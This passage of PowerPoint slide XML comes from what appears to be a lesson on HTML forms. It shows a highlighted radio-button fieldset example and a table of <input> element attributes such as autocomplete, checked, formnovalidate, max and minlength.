              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>male</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label</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</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a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;input</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type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"radio"</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name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gender</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>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value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"f"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>id</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female</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>label</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>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female</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>female</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label</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</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label</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for</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other</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;input</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type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"radio"</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name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gender</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>value</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"o"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>other</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>other</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label</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>fieldset</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="fi-FI"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13491579-C643-4DCE-9DA1-E039D27320EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>&lt;input&gt; element attributes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4F1ED31E-9577-4AC8-BC6D-3271378AC234}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1713058834"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1600200"/>
          <a:ext cx="10972799" cy="4023030"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1669976">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20000"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="9302823">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20001"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="365720">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Attribute</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Description</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10000"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="365720">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>autocomplete</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
                        <a:t>on</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t> | off</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10001"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="365720">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>autofocus</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>if present, gain focus at the page load up</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10002"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="365720">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>checked</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>radio/</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>checkbutton</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t> input element is preselected</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10003"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="365720">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>formnovalidate</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>if</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present</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don't</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validate</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the</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element</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10004"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="365720">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>max</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>maximum</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value</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t> for </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>number</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or</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range</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field</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10005"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="365720">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>maxlength</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>maximum number of characters allowed for password, search, </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="0" i="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>tel</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>, text, </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="0" i="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>url</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10006"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="365720">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>min</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>minimum value for </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>number</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or</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range</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field</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10007"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="365720">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>minlength</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="4570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minimum number of characters allowed for password, search, </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="0" i="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>tel</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>, text, </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="0" i="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>url</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45705" marB="45705"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2078958282"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="365720">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>multiple</a:t>
                      </a:r>
